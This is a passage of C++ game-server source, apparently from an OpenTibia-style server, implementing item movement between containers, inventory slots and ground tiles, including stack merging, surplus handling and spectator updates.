        }
    }

    if(toInventory)
    {
        toItem = player->getItem(to_cid);
        toContainer = dynamic_cast<Container *>(toItem);
    }
    else
    {
        toContainer = player->getContainer(to_cid);

        if(toContainer)
        {
            if(to_slotid >= toContainer->capacity())
                return;

            toItem = toContainer->getItem(to_slotid);
            Container *toSlotContainer = dynamic_cast<Container*>(toItem);
            if(toSlotContainer)
            {
                toContainer = toSlotContainer;
                toItem = NULL;
            }
        }
    }

    if(!fromItem || (toItem == fromItem) || (fromItem->isStackable() && count > fromItem->getItemCountOrSubtype()) || fromItem->getID() != itemid)
        return;

    //Container to container
    if(!fromInventory && fromContainer && toContainer)
    {
        Position fromPos = (fromContainer->pos.x == 0xFFFF ? player->pos : fromContainer->pos);
        Position toPos = (toContainer->pos.x == 0xFFFF ? player->pos : toContainer->pos);

        if(onPrepareMoveThing(player, fromPos, fromContainer, fromItem, toPos, toContainer, toItem, count))
        {

            autoCloseTrade(fromItem, true);
            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;

            //move around an item in a container
            if(fromItem->isStackable())
            {
                if(toItem && toItem != fromItem && toItem->getID() == fromItem->getID())
                {
                    oldToCount = toItem->getItemCountOrSubtype();
                    int32_t newToCount = std::min(100, oldToCount + count);
                    toItem->setItemCountOrSubtype(newToCount);

                    if(oldToCount != newToCount)
                    {
                        autoCloseTrade(toItem);
                    }

                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    int32_t surplusCount = oldToCount + count  - 100;
                    if(surplusCount > 0)
                    {
                        Item *surplusItem = Item::CreateItem(fromItem->getID(), surplusCount);
                        if(onPrepareMoveThing(player, fromPos, fromContainer, surplusItem, toPos, toContainer, NULL, count))
                        {
                            autoCloseTrade(toContainer);
                            toContainer->addItem(surplusItem);
                        }
                        else
                        {
                            delete surplusItem;
                            count -= surplusCount; //re-define the actual amount we move.
                            fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                        }
                    }
                }
                else if(count < oldFromCount)
                {
                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    Item* moveItem = Item::CreateItem(fromItem->getID(), count);
                    toContainer->addItem(moveItem);
                    autoCloseTrade(toContainer);
                }
                else
                {
                    if(fromContainer == toContainer)
                    {
                        fromContainer->moveItem(from_slotid, 0);
                    }
                    else if(fromContainer->removeItem(fromItem))
                    {
                        autoCloseTrade(toContainer);
                        toContainer->addItem(fromItem);
                    }
                }

                if(fromItem->getItemCountOrSubtype() == 0)
                {
                    fromContainer->removeItem(fromItem);
                    this->FreeThing(fromItem);
                }
            }
            else
            {
                if(fromContainer == toContainer)
                {
                    fromContainer->moveItem(from_slotid, 0);
                }
                else if(fromContainer->removeItem(fromItem))
                {
                    autoCloseTrade(toContainer);
                    toContainer->addItem(fromItem);
                }
            }

            if(player->isHoldingContainer(fromContainer) != player->isHoldingContainer(toContainer))
            {
                player->updateInventoryWeigth();
            }

            SpectatorVec list;
            SpectatorVec::iterator it;

            if(fromPos == toPos)
            {
                getSpectators(Range(fromPos, false), list);
            }
            else
            {
                getSpectators(Range(fromPos, toPos), list);
            }

            if(!list.empty())
            {
                //players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                    }
                }

                //none-players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(!dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                    }
                }
            }
            else
                player->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
        }
    }
    else
    {
        //inventory to inventory
        if(fromInventory && toInventory && !toContainer)
        {
            Position fromPos = player->pos;
            Position toPos = player->pos;
            if(onPrepareMoveThing(player, fromItem, (slots_t)to_cid, count) && onPrepareMoveThing(player, (slots_t)from_cid, fromItem, (slots_t)to_cid, toItem, count))
            {

                autoCloseTrade(fromItem, true);
                int32_t oldFromCount = fromItem->getItemCountOrSubtype();
                int32_t oldToCount = 0;

                if(fromItem->isStackable())
                {
                    if(toItem && toItem != fromItem && toItem->getID() == fromItem->getID())
                    {
                        oldToCount = toItem->getItemCountOrSubtype();
                        int32_t newToCount = std::min(100, oldToCount + count);
                        toItem->setItemCountOrSubtype(newToCount);

                        if(oldToCount != newToCount)
                        {
                            autoCloseTrade(toItem);
                        }

                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);

                        int32_t surplusCount = oldToCount + count  - 100;
                        if(surplusCount > 0)
                        {
                            fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                            player->sendCancel("Sorry not enough room.");
                        }

                        if(fromItem->getItemCountOrSubtype() == 0)
                        {
                            player->removeItemInventory(from_cid, true);
                            this->FreeThing(fromItem);
                        }
                    }
                    else if(count < oldFromCount)
                    {
                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);

                        autoCloseTrade(toItem);
                        player->removeItemInventory(to_cid, true);
                        player->addItemInventory(Item::CreateItem(fromItem->getID(), count), to_cid, true);

                        if(fromItem->getItemCountOrSubtype() == 0)
                        {
                            player->removeItemInventory(from_cid, true);
                            this->FreeThing(fromItem);
                        }
                    }
                    else
                    {
                        if(player->removeItemInventory(from_cid, true))
                        {
                            player->removeItemInventory(to_cid, true);
                            player->addItemInventory(fromItem, to_cid, true);
                        }
                    }
                }
                else if(player->removeItemInventory(from_cid, true))
                {
                    player->removeItemInventory(to_cid, true);
                    player->addItemInventory(fromItem, to_cid, true);
                }

                player->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
            }
        }
        //container to inventory
        else if(!fromInventory && fromContainer && toInventory)
        {
            if(onPrepareMoveThing(player, fromItem, (slots_t)to_cid, count) && onPrepareMoveThing(player, fromContainer, fromItem, (slots_t)to_cid, toItem, count))
            {
                autoCloseTrade(fromItem, true);
                int32_t oldFromCount = fromItem->getItemCountOrSubtype();
                int32_t oldToCount = 0;

                if(fromItem->isStackable())
                {
                    if(toItem && toItem != fromItem && toItem->getID() == fromItem->getID())
                    {
                        oldToCount = toItem->getItemCountOrSubtype();
                        int32_t newToCount = std::min(100, oldToCount + count);
                        toItem->setItemCountOrSubtype(newToCount);

                        if(oldToCount != newToCount)
                        {
                            autoCloseTrade(toItem);
                        }

                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);

                        int32_t surplusCount = oldToCount + count  - 100;
                        if(surplusCount > 0)
                        {
                            fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                            player->sendCancel("Sorry not enough room.");
                        }

                        if(fromItem->getItemCountOrSubtype() == 0)
                        {
                            fromContainer->removeItem(fromItem);
                            this->FreeThing(fromItem);
                        }
                    }
                    else if(count < oldFromCount)
                    {
                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);

                        player->removeItemInventory(to_cid, true);
                        player->addItemInventory(Item::CreateItem(fromItem->getID(), count), to_cid, true);

                        if(toItem)
                        {
                            fromContainer->addItem(toItem);
                        }

                        if(fromItem->getItemCountOrSubtype() == 0)
                        {
                            fromContainer->removeItem(fromItem);
                            this->FreeThing(fromItem);
                        }
                    }
                    else
                    {
                        if(fromContainer->removeItem(fromItem))
                        {
                            player->removeItemInventory(to_cid, true);
                            player->addItemInventory(fromItem, to_cid, true);

                            if(toItem)
                            {
                                fromContainer->addItem(toItem);
                            }
                        }
                    }
                }
                else if(fromContainer->removeItem(fromItem))
                {
                    player->removeItemInventory(to_cid, true);
                    player->addItemInventory(fromItem, to_cid, true);

                    if(toItem)
                    {
                        fromContainer->addItem(toItem);
                    }
                }

                if(!player->isHoldingContainer(fromContainer))
                {
                    player->updateInventoryWeigth();
                }

                //if(fromContainer->pos.x != 0xFFFF) {
                if(fromContainer->getTopParent()->pos.x != 0xFFFF)
                {
                    SpectatorVec list;
                    SpectatorVec::iterator it;

                    getSpectators(Range(fromContainer->getTopParent()->pos, false), list);

                    //players
                    for(it = list.begin(); it != list.end(); ++it)
                    {
                        if(dynamic_cast<Player*>(*it))
                        {
                            (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
                        }
                    }

                    //none-players
                    for(it = list.begin(); it != list.end(); ++it)
                    {
                        if(!dynamic_cast<Player*>(*it))
                        {
                            (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
                        }
                    }
                }
                else
                    player->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
            }
        }
        //inventory to container
        else if(fromInventory && toContainer)
        {
            Position fromPos = player->pos;
            Position toPos = (toContainer->pos.x == 0xFFFF ? player->pos : toContainer->pos);

            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;

            if(onPrepareMoveThing(player, fromItem, (slots_t)from_cid, toContainer, toItem, count))
            {
                autoCloseTrade(fromItem, true);
                if(fromItem->isStackable())
                {
                    if(toItem && toItem != fromItem && toItem->getID() == fromItem->getID())
                    {
                        oldToCount = toItem->getItemCountOrSubtype();
                        int32_t newToCount = std::min(100, oldToCount + count);
                        toItem->setItemCountOrSubtype(newToCount);

                        if(oldToCount != newToCount)
                        {
                            autoCloseTrade(toItem);
                        }

                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);

                        int32_t surplusCount = oldToCount + count  - 100;
                        if(surplusCount > 0)
                        {
                            Item *surplusItem = Item::CreateItem(fromItem->getID(), surplusCount);

                            if(onPrepareMoveThing(player, fromPos, NULL, surplusItem, toPos, toContainer, NULL, count))
                            {
                                autoCloseTrade(toContainer);
                                toContainer->addItem(surplusItem);
                            }
                            else
                            {
                                delete surplusItem;
                                count -= surplusCount; //re-define the actual amount we move.
                                fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                            }
                        }
                    }
                    else if(count < oldFromCount)
                    {
                        int32_t subcount = oldFromCount - count;
                        fromItem->setItemCountOrSubtype(subcount);
                        autoCloseTrade(toContainer);
                        toContainer->addItem(Item::CreateItem(fromItem->getID(), count));
                    }
                    else
                    {
                        if(player->removeItemInventory((slots_t)from_cid, true))
                        {
                            autoCloseTrade(toContainer);
                            toContainer->addItem(fromItem);

                            if(player->isHoldingContainer(toContainer))
                            {
                                player->updateInventoryWeigth();
                            }
                        }
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        player->removeItemInventory(from_cid, true);
                        this->FreeThing(fromItem);
                    }
                }
                else if(player->removeItemInventory(from_cid, true))
                {
                    autoCloseTrade(toContainer);
                    toContainer->addItem(fromItem);

                    if(player->isHoldingContainer(toContainer))
                    {
                        player->updateInventoryWeigth();
                    }
                }

                if(!player->isHoldingContainer(toContainer))
                {
                    player->updateInventoryWeigth();
                }

                if(toContainer->getTopParent()->pos.x != 0xFFFF)
                {
                    SpectatorVec list;
                    SpectatorVec::iterator it;

                    getSpectators(Range(toContainer->getTopParent()->pos, false), list);

                    //players
                    for(it = list.begin(); it != list.end(); ++it)
                    {
                        if(dynamic_cast<Player*>(*it))
                        {
                            (*it)->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                        }
                    }

                    //none-players
                    for(it = list.begin(); it != list.end(); ++it)
                    {
                        if(!dynamic_cast<Player*>(*it))
                        {
                            (*it)->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                        }
                    }
                }
                else
                    player->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
            }
        }
    }
}

//container/inventory to ground
void Game::thingMoveInternal(Player *player,
                             unsigned char from_cid, unsigned char from_slotid, uint16_t itemid, bool fromInventory,
                             const Position& toPos, unsigned char count)
{
    Container *fromContainer = NULL;
    Tile *toTile = map->getTile(toPos);
    if(!toTile)
        return;

    /*container to ground*/
    if(!fromInventory)
    {
        fromContainer = player->getContainer(from_cid);
        if(!fromContainer)
            return;

        Position fromPos = (fromContainer->pos.x == 0xFFFF ? player->pos : fromContainer->pos);
        Item *fromItem = dynamic_cast<Item*>(fromContainer->getItem(from_slotid));
        Item* toItem = dynamic_cast<Item*>(toTile->getTopDownItem());

        if(!fromItem || (toItem == fromItem) || (fromItem->isStackable() && count > fromItem->getItemCountOrSubtype()) || fromItem->getID() != itemid)
            return;

        if(onPrepareMoveThing(player, fromItem, fromPos, toPos, count) && onPrepareMoveThing(player, fromItem, NULL, toTile, count))
        {
            autoCloseTrade(fromItem, true);
            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;

            //Do action...
#ifdef TP_TRASH_BINS
            if (toItem && toItem->isDeleter())
            {
                fromContainer->removeItem(fromItem);
                FreeThing(fromItem);
            }
            else if(fromItem->isStackable())
            {
#else
            if(fromItem->isStackable())
            {
#endif //TP_TRASH_BINS
                if(toItem && toItem->getID() == fromItem->getID())
                {
                    oldToCount = toItem->getItemCountOrSubtype();
                    int32_t newToCount = std::min(100, oldToCount + count);
                    toItem->setItemCountOrSubtype(newToCount);

                    if(oldToCount != newToCount)
                    {
                        autoCloseTrade(toItem);
                    }

                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    int32_t surplusCount = oldToCount + count  - 100;
                    if(surplusCount > 0)
                    {
                        Item *surplusItem = Item::CreateItem(fromItem->getID(), surplusCount);
                        surplusItem->pos = toPos;

                        toTile->addThing(surplusItem);
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        fromContainer->removeItem(fromItem);
                        this->FreeThing(fromItem);
                    }
                }
                else if(count < oldFromCount)
                {
                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    Item *moveItem = Item::CreateItem(fromItem->getID(), count);
                    moveItem->pos = toPos;
                    toTile->addThing(moveItem);

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        fromContainer->removeItem(fromItem);
                        this->FreeThing(fromItem);
                    }
                }
                else if(fromContainer->removeItem(fromItem))
                {
                    fromItem->pos = toPos;
                    toTile->addThing(fromItem);
                }
            }
            else if(fromContainer->removeItem(fromItem))
            {
                fromItem->pos = toPos;
                toTile->addThing(fromItem);
            }

            if(player->isHoldingContainer(fromContainer))
            {
                player->updateInventoryWeigth();
            }

            SpectatorVec list;
            SpectatorVec::iterator it;

            getSpectators(Range(fromPos, false), list);

            SpectatorVec tolist;
            getSpectators(Range(toPos, true), tolist);

            for(it = tolist.begin(); it != tolist.end(); ++it)
            {
                if(std::find(list.begin(), list.end(), *it) == list.end())
                {
                    list.push_back(*it);
                }
            }

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, toPos, toItem, oldToCount, count);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromContainer, from_slotid, fromItem, oldFromCount, toPos, toItem, oldToCount, count);
                }
            }
        }
    }
    else /*inventory to ground*/
    {
        Item *fromItem = player->getItem(from_cid);
        if(!fromItem || (fromItem->isStackable() && count > fromItem->getItemCountOrSubtype()) || fromItem->getID() != itemid)
            return;

        if(onPrepareMoveThing(player, fromItem, player->pos, toPos, count) && onPrepareMoveThing(player, fromItem, NULL, toTile, count))
        {
            autoCloseTrade(fromItem, true);
            Item* toItem = dynamic_cast<Item*>(toTile->getTopDownItem());
            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;

            //Do action...
#ifdef TP_TRASH_BINS
            if(toItem && toItem->isDeleter())
            {
                player->removeItemInventory(from_cid, true);
                FreeThing(fromItem);
            }
            else if(fromItem->isStackable())
            {
#else
            if(fromItem->isStackable())
            {
#endif //TP_TRASH_BINS
                if(toItem && toItem->getID() == fromItem->getID())
                {
                    oldToCount = toItem->getItemCountOrSubtype();
                    int32_t newToCount = std::min(100, oldToCount + count);
                    toItem->setItemCountOrSubtype(newToCount);

                    if(oldToCount != newToCount)
                    {
                        autoCloseTrade(toItem);
                    }

                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    int32_t surplusCount = oldToCount + count  - 100;
                    if(surplusCount > 0)
                    {
                        Item *surplusItem = Item::CreateItem(fromItem->getID(), surplusCount);
                        surplusItem->pos = toPos;

                        toTile->addThing(surplusItem);
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        player->removeItemInventory(from_cid, true);
                        this->FreeThing(fromItem);
                    }
                }
                else if(count < oldFromCount)
                {
                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    Item *moveItem = Item::CreateItem(fromItem->getID(), count);
                    moveItem->pos = toPos;
                    toTile->addThing(moveItem);

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        player->removeItemInventory(from_cid, true);
                        this->FreeThing(fromItem);
                    }
                }
                else if(player->removeItemInventory(from_cid, true))
                {
                    fromItem->pos = toPos;
                    toTile->addThing(fromItem);
                }
            }
            else if(player->removeItemInventory(from_cid, true))
            {
                fromItem->pos = toPos;
                toTile->addThing(fromItem);
            }

            player->updateInventoryWeigth();

            SpectatorVec list;
            SpectatorVec::iterator it;

            getSpectators(Range(player->pos, false), list);

            SpectatorVec tolist;
            getSpectators(Range(toPos, true), tolist);

            for(it = tolist.begin(); it != tolist.end(); ++it)
            {
                if(std::find(list.begin(), list.end(), *it) == list.end())
                {
                    list.push_back(*it);
                }
            }

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, toPos, toItem, oldToCount, count);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, (slots_t)from_cid, fromItem, oldFromCount, toPos, toItem, oldToCount, count);
                }
            }
        }
    }

#ifdef TP_TRASH_BINS
    //creatureBroadcastTileUpdated(toPos);
    //sendAddThing
#endif //TP_TRASH_BINS
}

//ground to container/inventory
void Game::thingMoveInternal(Player *player, const Position& fromPos, unsigned char stackPos,
                             uint16_t itemid, unsigned char to_cid, unsigned char to_slotid, bool toInventory, unsigned char count)
{
    Tile *fromTile = map->getTile(fromPos);
    if(!fromTile)
        return;

    Container *toContainer = NULL;

    Item* fromItem = dynamic_cast<Item*>(fromTile->getTopDownItem());
    Item *toItem = NULL;

    if(!fromItem || (fromItem->getID() != itemid) || (fromItem != fromTile->getTopDownItem()))
        return;

    if(toInventory)
    {
        toItem = player->getItem(to_cid);
        toContainer = dynamic_cast<Container*>(toItem);
    }
    else
    {
        toContainer = player->getContainer(to_cid);
        if(!toContainer)
            return;

        toItem = toContainer->getItem(to_slotid);
        Container *toSlotContainer = dynamic_cast<Container*>(toItem);

        if(toSlotContainer)
        {
            toContainer = toSlotContainer;
            toItem = NULL;
        }
    }

    if((toItem == fromItem) || (fromItem->isStackable() && count > fromItem->getItemCountOrSubtype()))
        return;

    /*ground to container*/
    if(toContainer)
    {
        /*if(onPrepareMoveThing(player, fromItem, fromPos, player->pos, count) &&
        		onPrepareMoveThing(player, fromItem, NULL, toContainer, toItem, count))*/

        Position toPos = (toContainer->pos.x == 0xFFFF ? player->pos : toContainer->pos);
        if(onPrepareMoveThing(player, fromPos, NULL, fromItem, toPos, toContainer, toItem, count))
        {
            autoCloseTrade(fromItem, true);
            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;
            int32_t stackpos = fromTile->getThingStackPos(fromItem);

            if(fromItem->isStackable())
            {
                if(toItem && toItem->getID() == fromItem->getID())
                {
                    oldToCount = toItem->getItemCountOrSubtype();
                    int32_t newToCount = std::min(100, oldToCount + count);
                    toItem->setItemCountOrSubtype(newToCount);

                    if(oldToCount != newToCount)
                    {
                        autoCloseTrade(toItem);
                    }

                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    int32_t surplusCount = oldToCount + count  - 100;
                    if(surplusCount > 0)
                    {
                        Item *surplusItem = Item::CreateItem(fromItem->getID(), surplusCount);

                        if(onPrepareMoveThing(player, fromPos, NULL, surplusItem, toPos, toContainer, NULL, count))
                        {
                            autoCloseTrade(toContainer);
                            toContainer->addItem(surplusItem);
                        }
                        else
                        {
                            delete surplusItem;
                            count -= surplusCount; //re-define the actual amount we move.
                            fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                        }
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        if(fromTile->removeThing(fromItem))
                        {
                            this->FreeThing(fromItem);
                        }
                    }
                }
                else if(count < oldFromCount)
                {
                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    autoCloseTrade(toContainer);
                    toContainer->addItem(Item::CreateItem(fromItem->getID(), count));

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        if(fromTile->removeThing(fromItem))
                        {
                            this->FreeThing(fromItem);
                        }
                    }
                }
                else if(fromTile->removeThing(fromItem))
                {
                    autoCloseTrade(toContainer);
                    toContainer->addItem(fromItem);
                }
            }
            else
            {
                if(fromTile->removeThing(fromItem))
                {
                    autoCloseTrade(toContainer);
                    toContainer->addItem(fromItem);
                }
            }

            if(player->isHoldingContainer(toContainer))
            {
                player->updateInventoryWeigth();
            }

            SpectatorVec list;
            SpectatorVec::iterator it;

            getSpectators(Range(fromPos, true), list);

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromPos, stackpos, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromPos, stackpos, fromItem, oldFromCount, toContainer, to_slotid, toItem, oldToCount, count);
                }
            }
        }
    }
    //ground to inventory
    else if(toInventory)
    {
        if(onPrepareMoveThing(player, fromPos, fromItem, (slots_t)to_cid, count) && onPrepareMoveThing(player, fromItem, (slots_t)to_cid, count))
        {
            autoCloseTrade(fromItem, true);
            int32_t oldFromCount = fromItem->getItemCountOrSubtype();
            int32_t oldToCount = 0;
            int32_t stackpos = fromTile->getThingStackPos(fromItem);

            if(fromItem->isStackable())
            {
                if(toItem && toItem->getID() == fromItem->getID())
                {
                    oldToCount = toItem->getItemCountOrSubtype();
                    int32_t newToCount = std::min(100, oldToCount + count);
                    toItem->setItemCountOrSubtype(newToCount);

                    if(oldToCount != newToCount)
                    {
                        autoCloseTrade(toItem);
                    }

                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    int32_t surplusCount = oldToCount + count  - 100;
                    if(surplusCount > 0)
                    {
                        fromItem->setItemCountOrSubtype(fromItem->getItemCountOrSubtype() + surplusCount);
                        player->sendCancel("Sorry not enough room.");
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        if(fromTile->removeThing(fromItem))
                        {
                            this->FreeThing(fromItem);
                        }
                    }
                }
                else if(count < oldFromCount)
                {
                    int32_t subcount = oldFromCount - count;
                    fromItem->setItemCountOrSubtype(subcount);

                    player->removeItemInventory(to_cid, true);
                    player->addItemInventory(Item::CreateItem(fromItem->getID(), count), to_cid, true);

                    if(toItem)
                    {
                        autoCloseTrade(toItem);
                        fromTile->addThing(toItem);
                        toItem->pos = fromPos;
                    }

                    if(fromItem->getItemCountOrSubtype() == 0)
                    {
                        if(fromTile->removeThing(fromItem))
                        {
                            this->FreeThing(fromItem);
                        }
                    }
                }
                else
                {
                    if(fromTile->removeThing(fromItem))
                    {
                        player->removeItemInventory(to_cid, true);
                        player->addItemInventory(fromItem, to_cid, true);

                        if(toItem)
                        {
                            autoCloseTrade(toItem);
                            fromTile->addThing(toItem);
                            toItem->pos = fromPos;
                        }
                    }
                }
            }
            else
            {
                if(fromTile->removeThing(fromItem))
                {
                    player->removeItemInventory(to_cid, true);
                    player->addItemInventory(fromItem, to_cid, true);

                    if(toItem)
                    {
                        autoCloseTrade(toItem);
                        fromTile->addThing(toItem);
                        toItem->pos = fromPos;
                    }
                }
            }

            player->updateInventoryWeigth();

            SpectatorVec list;
            SpectatorVec::iterator it;

            getSpectators(Range(fromPos, true), list);

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromPos, stackpos, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingMove(player, fromPos, stackpos, fromItem, oldFromCount, (slots_t)to_cid, toItem, oldToCount, count);
                }
            }
        }
    }
}

//ground to ground
void Game::thingMoveInternal(Creature *creature, uint16_t from_x, uint16_t from_y, unsigned char from_z,
                             unsigned char stackPos, uint16_t itemid, uint16_t to_x, uint16_t to_y, unsigned char to_z, unsigned char count)
{
    Tile *fromTile = getTile(from_x, from_y, from_z);
    if(!fromTile)
        return;

    if(dynamic_cast<Player*>(creature) && fromTile && !fromTile->ground)
    {
        dynamic_cast<Player*>(creature)->sendCancelWalk();
        return;
    }

    Tile *toTile   = getTile(to_x, to_y, to_z);
    /*
    if(!toTile){
    	if(dynamic_cast<Player*>(player))
    		dynamic_cast<Player*>(player)->sendCancelWalk("Sorry, not possible...");
    	return;
    }
    */

    Thing *thing = fromTile->getThingByStackPos(stackPos);

    if (!thing)
        return;

    Item* item = dynamic_cast<Item*>(thing);
    Creature* creatureMoving = dynamic_cast<Creature*>(thing);
    Player* playerMoving = dynamic_cast<Player*>(creatureMoving);
    Player* player = dynamic_cast<Player*>(creature);

    Position oldPos;
    oldPos.x = from_x;
    oldPos.y = from_y;
    oldPos.z = from_z;

#ifdef TP_TRASH_BINS
    if(toTile)
    {
        Thing *tothing = toTile->getThingByStackPos(stackPos);
        Item *toItem = dynamic_cast<Item*>(tothing);

        if(item && toItem && !playerMoving && !creature && toItem->isDeleter())
        {
            fromTile->removeThing(item);
            this->FreeThing(item);
            //creatureBroadcastTileUpdated(oldPos);
            sendRemoveThing(player, item->pos, item, stackPos);
            return;
        }
    }
#endif //TP_TRASH_BINS

    if(toTile && player && playerMoving && playerMoving != player && toTile->getFieldItem())
    {
        player->sendCancel("Sorry, not possible.");
        return;
    }

    // *** Creature moving itself to a non-tile
    if(!toTile && creatureMoving && creatureMoving == creature)
    {
        //change level begin
        Tile* downTile = getTile(to_x, to_y, to_z+1);
        //diagonal begin
        if(!downTile)
        {
            if(player)
            {
                player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
                player->sendCancelWalk();
            }

            return;
        }

        if(downTile->floorChange(NORTH) && downTile->floorChange(EAST))
        {
            teleport(creatureMoving, Position(creatureMoving->pos.x-2, creatureMoving->pos.y+2, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(NORTH) && downTile->floorChange(WEST))
        {
            teleport(creatureMoving, Position(creatureMoving->pos.x+2, creatureMoving->pos.y+2, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(SOUTH) && downTile->floorChange(EAST))
        {
            teleport(creatureMoving, Position(creatureMoving->pos.x-2, creatureMoving->pos.y-2, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(SOUTH) && downTile->floorChange(WEST))
        {
            teleport(creatureMoving, Position(creatureMoving->pos.x+2, creatureMoving->pos.y-2, creatureMoving->pos.z+1));
        }
        //diagonal end
        else if(downTile->floorChange(NORTH))
        {
            teleport(creatureMoving, Position(to_x, to_y + 1, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(SOUTH))
        {
            teleport(creatureMoving, Position(to_x, to_y - 1, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(EAST))
        {
            teleport(creatureMoving, Position(to_x - 1, to_y, creatureMoving->pos.z+1));
        }
        else if(downTile->floorChange(WEST))
        {
            teleport(creatureMoving, Position(to_x + 1, to_y, creatureMoving->pos.z+1));
        }
        else if(player)
        {
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
            player->sendCancelWalk();
        }

        //change level end
        return;
    }


    // *** Checking if the thing can be moved around

    if(!toTile)
        return;

    if(!onPrepareMoveThing(creature, thing, oldPos, Position(to_x, to_y, to_z), count))
        return;

    if(creatureMoving && !onPrepareMoveCreature(creature, creatureMoving, fromTile, toTile))
        return;

    if(!onPrepareMoveThing(creature, thing, fromTile, toTile, count))
        return;

    /*
    if(item && (item->getID() != itemid || item != fromTile->getTopDownItem()))
    	return;
    */

    // *** If the destiny is a teleport item, teleport the thing

    const Teleport *teleportitem = toTile->getTeleportItem();
    if(teleportitem)
    {
        teleport(thing, teleportitem->getDestPos());
        return;
    }
    Monster* monsterMoving = dynamic_cast<Monster*>(creatureMoving);
    if (monsterMoving && toTile->isPz())
    {
        return;
    }
#ifdef TLM_HOUSE_SYSTEM
    if (playerMoving && toTile->getHouse() &&
            (fromTile->getHouse() != toTile->getHouse() || playerMoving->houseRightsChanged))
